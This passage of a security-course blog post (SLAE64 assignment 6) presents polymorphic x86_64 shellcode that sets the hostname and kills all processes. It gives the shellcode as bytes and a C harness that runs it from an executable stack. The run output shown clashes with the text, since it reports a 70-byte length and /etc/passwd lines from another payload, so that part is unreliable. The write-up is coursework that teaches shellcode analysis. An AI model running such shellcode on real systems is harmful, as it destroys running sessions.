+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x3e</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#ae81ff">0x3f</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/setHostname_killall-605 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../../assembler.sh poly_setHostaname_killall.nasm 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">46</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x31\xc0\x48\x31\xf6\x04\xaa\x49\xb9\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x51\x48\x89\xe7\x40\x80\xc6\x08\x0f\x05\x48\x31\xc0\x04\x3e\x48\x89\xc7\x48\x83\xef\x3f\x48\xff\xc6\x0f\x05&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc0\x48\x31\xf6\x04\xaa\x49\xb9\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x51\x48\x89\xe7\x40\x80\xc6\x08\x0f\x05\x48\x31\xc0\x04\x3e\x48\x89\xc7\x48\x83\xef\x3f\x48\xff\xc6\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/setHostname_killall-605 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:8:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">70</span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/usr/bin/zsh
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span></code></pre></div><p>After executing the shellcode, we get logged out of the session and the hostname is changed</p>
+<p><strong>Size: 46 bytes</strong></p>
+<p>Increased <code>39,4%</code>, which reflects the additional 13 bytes.</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p><code>Student ID: PA-31319</code></p>
+<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xnibbles.github.io/tags/slae64/">slae64</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_5/">
+    <span class="title">Next »</span>
+    <br>
+    <span>SLAE64 Assignment 5 - Msfvenom Shellcode Analysis </span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Slae64 Assignment 6 - Polymorphic Shellcode on twitter"
+        href="https://twitter.com/intent/tweet/?text=Slae64%20Assignment%206%20-%20Polymorphic%20Shellcode&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_6%2f&amp;hashtags=slae64">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Slae64 Assignment 6 - Polymorphic Shellcode on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_6%2f&amp;title=Slae64%20Assignment%206%20-%20Polymorphic%20Shellcode&amp;summary=Slae64%20Assignment%206%20-%20Polymorphic%20Shellcode&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_6%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
